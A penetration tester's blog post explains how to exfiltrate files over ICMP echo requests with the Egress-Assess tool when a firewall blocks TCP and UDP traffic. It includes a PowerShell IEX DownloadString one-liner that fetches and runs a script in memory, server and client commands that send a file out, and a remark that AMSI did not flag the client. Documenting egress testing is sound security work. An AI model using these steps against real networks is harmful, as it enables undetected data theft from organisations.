---
title:  "ICMP Tunneling"
date:   2021-10-10 19:12:00 +0000
categories: [techniques]
tags: [windows, ICMP, Data Extraction]
---

I recently had a situation during an engagement where i needed to demonstrate that data could be extracted from the organisation. I wanted to exfil data without going over the internet for security as well as for ease of use duing the engagement and speed.
The VPN when connected, and as expected, didn't allow local access as all routing went through the established tunnel first. However when the tunnel was disconnected the firewall would block all TCP and UDP access but would allow ICMP traffic to local subnets.
This then led me to look into ICMP tunneling. I found various ways of gaining a reverse shell however data exfiltration was more tricky - this is where Egress Assess comes in.   
From the Github Page [here](https://github.com/FortyNorthSecurity/Egress-Assess) - "Egress-Assess is a tool used to test egress data detection capabilities."

Egress-Assess has many use cases for confirming if data can be extracted out of the network including HTTP, SMB, ICMP and more. It also has PowerShell and Python implementations for both server and client. This is good for us as its unliekly that we normally have PowerShell access on Windows based systems.
Another great feature is that the client doesnt require local administrative privileges to run.
During testing it was also noted that as from the time of testing amsi didnt detect the client software as malicous or blocked the traffic as suspicous.

The setup uses a tradtional client / Server design. The server does require local admin rights. My setup was a Debian 10 Box with a Windows 10 client.

Server (Debian) - 192.168.1.50
Client (Win 10) - 192.168.1.239


Againg from the Github Page, ICMP - The data is broken up into bytes and base64 encoded and sent over the wire in an ICMP Type 8 ECHO request. the data is placed inside the data field of the packet. The ECHO requests are continuously made to the EgressAsess Server which receives the ICMP request and gathers the data and decodes it.

To start firstly, confirm that you can send and receive ICMP echo requests and Responses bi-directionally.

Once confirmed, on the server, first clone down the repository.

{% include codeHeader.html %}
```
git clone https://github.com/FortyNorthSecurity/Egress-Assess.git
```

Next run the setup.sh from within the setup folder to install the necessasary files.
Fix any errors if you get any before continuing.

```
./setup/.setup.sh
```

Next start the server with the ICMP fetaures enabled:

```
python Egress-Assess.py --server icmp --ip 192.168.1.50

```
If the server has started correctly you should see the following:
![img-description](/images/icmp-4.JPG)
_ICMP Server Started & waiting for connections_

Next you can either download the file onto the client, or run it in memeory directly.

```
IEX (New-Object Net.Webclient).DownloadString(‘https://raw.githubusercontent.com/ChrisTruncer/Egress-Assess/master/Invoke-EgressAssess.ps1‘)
```


Next, you have two main options. You either user the built-in audit tools that will create dummy data to mimic sensitive information such as Social Security Numbers / Credit Cards, OR you can specify specfic custom files.

I decided to create my own very simple file to understand how it was being tranferred. I did this by creating a file with some basic text inside on the client.

```
echo "Super Secret Info to Extract" > SuperSecretData.txt
```

We specify the File we want using the "-DataType" argument. ( You could also put "-DataType cc" for CreditCard.

![img-description](/images/icmp-9.JPG)
_Sending a file though an ICMP Packet_


```
Invoke-EgressAssess -client icmp -ip 192.168.1.50 -Datatype 'C:\Videos\SuperSecretData.txt' -Verbose
```

By using the "-Verbose" argument we can see that the connection was sucessful and that the client has indicated that the file was sucessfully sent.

On the server we can see a message confirming that the file has been recieved as expected.

![img-description](/images/icmp-10.JPG)
_File Received on Server_

![img-description](/images/icmp-11.JPG)
_File Received on Server_


To confirm how this worked, we can see in Wireshark that the data is indeed base64 encoded.
![img-description](/images/icmp-12.JPG)
_Wireshark capture of base64 encoded data in an ICMP Packet_
![img-description](/images/icmp-13.JPG)
_Wireshark capture of base64 encoded data in an ICMP Packet_

Therefore if we decode the base 64 we can see our message as expected and confirm how the data was transferred.
![img-description](/images/icmp-14.JPG)


